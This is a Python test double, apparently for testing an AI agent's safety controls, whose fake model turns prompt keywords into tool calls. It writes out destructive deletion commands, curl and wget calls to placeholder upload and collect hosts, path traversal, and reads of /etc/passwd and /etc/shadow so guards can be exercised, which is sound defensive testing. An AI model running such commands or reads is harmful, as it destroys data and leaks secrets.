"""Predictable planning logic used to test infrastructure deterministically."""

from __future__ import annotations

import re

from app.agent.model_contract import coerce_model_input
from app.protocol import ModelDecision, ModelInput, ModelToolCall


class FakeChatModel:
    version = "fake-chat-model-v2"

    def plan(
        self,
        model_input: ModelInput | str,
        *,
        state: dict | None = None,
    ) -> ModelDecision:
        prompt = coerce_model_input(model_input, state=state).prompt
        lowered = prompt.casefold()
        loop = "无限循环" in prompt or "loop forever" in lowered

        command_markers = (
            "rm -rf /",
            "del /s /q c:\\*",
            "curl https://example.invalid/upload",
            "wget https://example.invalid/collect",
        )
        for marker in command_markers:
            if marker in lowered:
                return self._tool("run_command", {"command": marker}, loop)

        write_file = re.search(
            r"(?:写入文件|write file)\s*(/workspace/[^\s，,。]+)"
            r"[\s，,]*(?:内容|content)\s*[:：=]\s*(.+)",
            prompt,
            flags=re.IGNORECASE,
        )
        if write_file:
            return self._tool(
                "write_file",
                {"path": write_file.group(1), "content": write_file.group(2).strip()},
                loop,
            )

        internal_api = re.search(r"/(?:mock)/[^\s，,。]+", prompt, flags=re.IGNORECASE)
        if internal_api and ("内部 api" in lowered or "internal api" in lowered):
            city = re.search(r"city\s*[=:：]\s*([^\s，,。]+)", prompt, flags=re.IGNORECASE)
            return self._tool(
                "call_internal_api",
                {
                    "endpoint": internal_api.group(0),
                    "payload": {"city": city.group(1)} if city else {},
                },
                loop,
            )

        traversal = re.search(r"(?:\.\./)+[^\s，。；;]+", prompt)
        if traversal:
            return self._tool("read_file", {"path": traversal.group(0)}, loop)

        restricted = re.search(r"/(?:etc/(?:passwd|shadow)|private/[^\s，。；;]+)", prompt)
        if restricted:
            return self._tool("read_file", {"path": restricted.group(0)}, loop)

        allowed = re.search(r"/workspace/[^\s，。；;]+", prompt)
        if allowed:
            return self._tool("read_file", {"path": allowed.group(0)}, loop)

        if loop:
            return self._tool("run_command", {"command": "echo loop"}, True)
        return ModelDecision(assistant_text="No controlled tool is required.")

    @staticmethod
    def _tool(name: str, arguments: dict, loop: bool) -> ModelDecision:
        return ModelDecision(
            tool_calls=[ModelToolCall(name=name, arguments=arguments)],
            continue_loop=loop,
        )

